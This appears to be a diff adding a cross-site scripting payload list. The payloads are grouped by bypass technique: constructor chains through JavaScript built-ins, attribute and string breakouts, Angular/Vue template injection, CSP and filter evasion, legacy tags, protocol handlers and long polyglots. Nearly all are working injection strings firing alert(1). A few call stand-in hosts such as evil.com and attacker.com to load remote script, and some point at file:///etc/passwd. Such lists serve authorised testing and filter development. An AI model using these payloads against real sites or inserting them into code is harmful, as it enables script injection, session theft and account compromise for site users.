+<script>new WeakSet().constructor.constructor('alert(1)')()</script>
+<img src=x onerror="new WeakMap().constructor.constructor('alert(1)')()">
+<svg onload="new WeakMap().constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH BIGINT
+# ========================================
+<script>BigInt.prototype.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="BigInt.prototype.constructor.constructor('alert(1)')()">
+<svg onload="BigInt.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH INTL
+# ========================================
+<script>Intl.Collator.constructor.constructor('alert(1)')()</script>
+<script>Intl.DateTimeFormat.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="Intl.Collator.constructor.constructor('alert(1)')()">
+<svg onload="Intl.Collator.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH WEBASSEMBLY
+# ========================================
+<script>WebAssembly.Module.constructor.constructor('alert(1)')()</script>
+<script>WebAssembly.Instance.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="WebAssembly.Module.constructor.constructor('alert(1)')()">
+<svg onload="WebAssembly.Module.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH ATOMICS
+# ========================================
+<script>Atomics.add.constructor('alert(1)')()</script>
+<script>Atomics.load.constructor('alert(1)')()</script>
+<img src=x onerror="Atomics.add.constructor('alert(1)')()">
+<svg onload="Atomics.add.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH SHAREDARRAYBUFFER
+# ========================================
+<script>SharedArrayBuffer.prototype.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="SharedArrayBuffer.prototype.constructor.constructor('alert(1)')()">
+<svg onload="SharedArrayBuffer.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH ERROR OBJECTS
+# ========================================
+<script>Error.prototype.constructor.constructor('alert(1)')()</script>
+<script>TypeError.prototype.constructor.constructor('alert(1)')()</script>
+<script>RangeError.prototype.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="Error.prototype.constructor.constructor('alert(1)')()">
+<svg onload="Error.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH JSON
+# ========================================
+<script>JSON.parse.constructor('alert(1)')()</script>
+<script>JSON.stringify.constructor('alert(1)')()</script>
+<img src=x onerror="JSON.parse.constructor('alert(1)')()">
+<svg onload="JSON.parse.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH MATH
+# ========================================
+<script>Math.random.constructor('alert(1)')()</script>
+<script>Math.floor.constructor('alert(1)')()</script>
+<img src=x onerror="Math.random.constructor('alert(1)')()">
+<svg onload="Math.random.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH DATE
+# ========================================
+<script>Date.prototype.constructor.constructor('alert(1)')()</script>
+<script>Date.now.constructor('alert(1)')()</script>
+<img src=x onerror="Date.prototype.constructor.constructor('alert(1)')()">
+<svg onload="Date.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH BOOLEAN
+# ========================================
+<script>Boolean.prototype.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="Boolean.prototype.constructor.constructor('alert(1)')()">
+<svg onload="Boolean.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH NUMBER
+# ========================================
+<script>Number.prototype.constructor.constructor('alert(1)')()</script>
+<script>Number.parseInt.constructor('alert(1)')()</script>
+<img src=x onerror="Number.prototype.constructor.constructor('alert(1)')()">
+<svg onload="Number.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH STRING
+# ========================================
+<script>String.prototype.constructor.constructor('alert(1)')()</script>
+<script>String.fromCharCode.constructor('alert(1)')()</script>
+<img src=x onerror="String.prototype.constructor.constructor('alert(1)')()">
+<svg onload="String.prototype.constructor.constructor('alert(1)')()">
+
+# ========================================
+# CONTEXT-SPECIFIC BYPASSES
+# ========================================
+
+# Inside HTML attributes
+" onmouseover="alert(1)" x="
+' onmouseover='alert(1)' x='
+" onfocus="alert(1)" autofocus x="
+' onfocus='alert(1)' autofocus x='
+" onclick="alert(1)" x="
+' onclick='alert(1)' x='
+
+# Inside JavaScript strings
+';alert(1);//
+";alert(1);//
+';alert(1);/*
+";alert(1);/*
+\';alert(1);//
+\";alert(1);//
+
+# Inside HTML comments
+--><script>alert(1)</script><!--
+--><img src=x onerror=alert(1)><!--
+--><svg onload=alert(1)><!--
+
+# Inside CDATA sections
+]]><script>alert(1)</script><![CDATA[
+]]><img src=x onerror=alert(1)><![CDATA[
+]]><svg onload=alert(1)><![CDATA[
+
+# ========================================
+# MODERN BROWSER BYPASSES
+# ========================================
+
+# ES6 Template Literals
+<script>`${alert(1)}`</script>
+<script>`${constructor.constructor('alert(1)')()}`</script>
+<img src=x onerror="`${alert(1)}`">
+<svg onload="`${alert(1)}`">
+
+# Arrow Functions
+<script>((x)=>alert(x))(1)</script>
+<script>(()=>alert(1))()</script>
+<img src=x onerror="((x)=>alert(x))(1)">
+<svg onload="(()=>alert(1))()">
+
+# Destructuring
+<script>({x:alert}={x:alert});x(1)</script>
+<script>[alert][0](1)</script>
+<img src=x onerror="({x:alert}={x:alert});x(1)">
+<svg onload="[alert][0](1)">
+
+# Spread Operator
+<script>[...`alert(1)`].join``</script>
+<script>alert(...[1])</script>
+<img src=x onerror="alert(...[1])">
+<svg onload="alert(...[1])">
+
+# ========================================
+# FRAMEWORK BYPASSES (Angular, React, Vue)
+# ========================================
+
+# Angular
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+{{this.constructor.constructor('alert(1)')()}}
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+
+# React JSX
+<img src=x onerror={alert(1)} />
+<div onClick={alert(1)}>Click</div>
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+
+# Vue.js
+{{constructor.constructor('alert(1)')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div @click="alert(1)">Click</div>
+
+# ========================================
+# MOBILE BROWSER BYPASSES
+# ========================================
+<input type="search" onsearch="alert(1)" value="search">
+<input type="tel" oninput="alert(1)">
+<input type="url" oninput="alert(1)">
+<input type="email" oninput="alert(1)">
+<input type="date" onchange="alert(1)">
+<input type="time" onchange="alert(1)">
+<input type="datetime-local" onchange="alert(1)">
+<input type="month" onchange="alert(1)">
+<input type="week" onchange="alert(1)">
+<input type="color" onchange="alert(1)">
+<input type="range" oninput="alert(1)">
+<input type="number" oninput="alert(1)">
+
+# ========================================
+# LEGACY BROWSER BYPASSES
+# ========================================
+<bgsound src="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<applet code="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<xml src="javascript:alert(1)">
+<comment><img src="javascript:alert(1)"></comment>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<style>@import"javascript:alert(1)";</style>
+<style>body{background:url("javascript:alert(1)")}</style>
+<style>body{behavior:url("javascript:alert(1)")}</style>
+<style>body{-moz-binding:url("javascript:alert(1)")}</style>
+
+# ========================================
+# CONTENT SECURITY POLICY BYPASSES
+# ========================================
+<script nonce="random">alert(1)</script>
+<script src="data:,alert(1)"></script>
+<script src="data:text/javascript,alert(1)"></script>
+<script>import('data:text/javascript,alert(1)')</script>
+<script>eval('al'+'ert(1)')</script>
+<script>Function('al'+'ert(1)')()</script>
+<script>setTimeout('al'+'ert(1)',1)</script>
+<script>setInterval('al'+'ert(1)',1000)</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>''.constructor.constructor('alert(1)')()</script>
+
+# ========================================
+# BYPASS WITH ALTERNATE PROTOCOLS
+# ========================================
+<iframe src="about:blank" onload="this.contentDocument.write('<script>parent.alert(1)</script>')">
+<iframe src="about:blank" onload="this.contentWindow.alert(1)">
+<object data="about:blank" onload="alert(1)">
+<embed src="about:blank" onload="alert(1)">
+<iframe src="mhtml:http://attacker.com/xss.html!alert">
+<iframe src="mk:@MSITStore:C:\windows\help\ntdef.chm::/alert.htm">
+
+# ========================================
+# BYPASS WITH FILE PROTOCOLS
+# ========================================
+<iframe src="file:///etc/passwd" onerror="alert(1)">
+<iframe src="file://localhost/etc/passwd" onerror="alert(1)">
+<object data="file:///etc/passwd" onerror="alert(1)">
+<embed src="file:///etc/passwd" onerror="alert(1)">
+
+# ========================================
+# BYPASS WITH SPECIAL CHARACTERS
+# ========================================
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<script/src=//evil.com></script>
+<iframe/src=javascript:alert(1)>
+<object/data=javascript:alert(1)>
+<embed/src=javascript:alert(1)>
+<form/action=javascript:alert(1)><input/type=submit>
+<button/onclick=alert(1)>Click</button>
+<input/type=image/src=x/onclick=alert(1)>
+<select/onfocus=alert(1)/autofocus>
+<textarea/onfocus=alert(1)/autofocus>
+<keygen/onfocus=alert(1)/autofocus>
+
+# ========================================
+# BYPASS WITH MIXED CONTENT
+# ========================================
+<script>document.domain='attacker.com';alert(1)</script>
+<script>document.cookie='xss=1';alert(document.cookie)</script>
+<script>localStorage.setItem('xss','1');alert(localStorage.getItem('xss'))</script>
+<script>sessionStorage.setItem('xss','1');alert(sessionStorage.getItem('xss'))</script>
+<script>history.pushState({},'','javascript:alert(1)')</script>
+<script>history.replaceState({},'','javascript:alert(1)')</script>
+
+# ========================================
+# BYPASS FOR DIFFERENT CONTEXTS
+# ========================================
+
+# URL Context
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:alert(1)
+livescript:alert(1)
+mocha:alert(1)
+
+# CSS Context
+<style>@import"javascript:alert(1)";</style>
+<style>body{background:url(javascript:alert(1))}</style>
+<style>body{background-image:url(javascript:alert(1))}</style>
+<style>body{behavior:url(javascript:alert(1))}</style>
+<style>body{-moz-binding:url(javascript:alert(1))}</style>
+
+# JSON Context
+{"xss":"<script>alert(1)</script>"}
+{"xss":"<img src=x onerror=alert(1)>"}
+{"xss":"<svg onload=alert(1)>"}
+
+# XML Context
+<?xml version="1.0"?><root><![CDATA[<script>alert(1)</script>]]></root>
+<?xml version="1.0"?><root><script>alert(1)</script></root>
+<?xml version="1.0"?><root><img src="x" onerror="alert(1)"/></root>
+
+# ========================================
+# FINAL ADVANCED POLYGLOTS
+# ========================================
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+</script><script>alert(1)</script>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+'><svg onload=alert(1)>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<script>alert(1)</script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
